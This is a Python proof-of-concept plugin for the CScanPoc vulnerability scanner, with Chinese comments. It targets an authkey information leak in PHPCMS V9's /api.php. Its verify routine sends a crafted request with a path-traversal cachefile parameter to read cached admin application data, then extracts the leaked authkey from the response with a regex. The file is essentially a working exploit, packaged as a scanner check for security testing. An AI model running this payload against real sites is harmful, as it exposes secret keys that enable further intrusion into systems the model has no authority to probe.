# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0102'  # 平台漏洞编号，留空
    name = 'PHPCMS V9 /api.php Authkey 信息泄漏漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-07-17'  # 漏洞公布时间
    desc = '''
        PHPCMS V9 /api.php Authkey 信息泄漏漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'V9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0c35742c-1612-450a-b67a-6b640e3abd21'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ('/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&'
                       'key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin'
                       '\\caches_data\\applist&path=admin')
            verify_url = self.target + payload
            req = requests.get(verify_url)
            pathinfo = re.compile(r'aaaaa\(\[",(.*),,,"\]\)')
            match = pathinfo.findall(req.text)
            if match:
                path = match[0]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息:path={path}'.format(
                    target=self.target, name=self.vuln.name, path=path))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
